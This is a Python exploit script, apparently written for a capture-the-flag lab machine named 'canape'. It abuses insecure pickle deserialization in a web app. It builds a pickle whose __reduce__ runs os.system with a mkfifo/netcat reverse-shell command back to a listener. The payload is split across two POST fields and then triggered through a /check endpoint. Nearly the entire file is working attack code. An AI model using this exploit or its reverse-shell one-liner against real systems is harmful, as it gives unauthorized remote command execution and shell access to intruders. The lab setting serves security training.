#!/usr/bin/env python3

import os
import cPickle
import requests
import argparse
from hashlib import md5

class Shell(object):

  def __init__(self, cmd):
      self.cmd = cmd

  def __reduce__(self):
    return (os.system, ('echo moe && ' + self.cmd,))

def post_sender(url, post_params, proxy):
  requests.packages.urllib3.disable_warnings()
  proxies = {'http': proxy, 'https': proxy}

  print('\n>> %s ... ' % url)

  try:
    r = requests.post(url, data=post_params, verify=False, proxies=proxies)
  except:
    print("\nERROR: Cannot sent request to server.")
    raise

  if (str(r.status_code) != '200'):
    print(r.status_code)
    exit()

def create_payload(ip, port, listener, proxy):

  lhost, lport = listener.split(':')
  cmd = "rm /tmp/0xdf; mkfifo /tmp/0xdf; cat /tmp/0xdf | /bin/sh -i 2>&1 | nc {} {}> /tmp/0xdf".format(lhost, lport)

  shell = cPickle.dumps(Shell(cmd))

  char = shell[:30]
  quote = shell[31:]

  url = "http://{}:{}/submit".format(ip,port)
  post_params = {'character':char, 'quote':quote}

  post_sender(url, post_params, proxy)

  p_id = md5(char + quote).hexdigest()
  print('\n[+] File name: {}'.format(p_id))

  return p_id

def trigger_payload(ip, port, p_id, proxy):

  url = "http://{}:{}/check".format(ip,port)
  post_params = {'id':p_id}
  
  post_sender(url, post_params, proxy)

  print('\n[+] Done!')

def get_args():
  parser = argparse.ArgumentParser( prog="pickle-canape.py",
                    formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50),
                    epilog= '''
                    This script will exploit the pickle deserialize vulnerability at canape box.
                    ''')
  parser.add_argument("ip", help="ip of target site (ex: 10.10.10.70)")
  parser.add_argument("-p", "--port", default="80", help="Port of target site (default = 80)")
  parser.add_argument("-i", "--id", default="", help="Name of the payload file (default = None)")
  parser.add_argument("-l", "--listener", default="10.10.14.6:443", help="Listener to get reverse shell (default = 10.10.14.6:443)")
  parser.add_argument("-P", "--proxy", default="http://127.0.0.1:8080/", help="Configure a proxy (default = http://127.0.0.1:8080/)")
  args = parser.parse_args()
  return args

def main():

  args = get_args() # get the cl args

  p_id = args.id.strip()

  if (p_id == ""):
    p_id = create_payload(args.ip.strip(), args.port.strip(), args.listener.strip(), args.proxy.strip())

  trigger_payload(args.ip.strip(), args.port.strip(), p_id, args.proxy.strip())


if __name__ == '__main__':
  main()
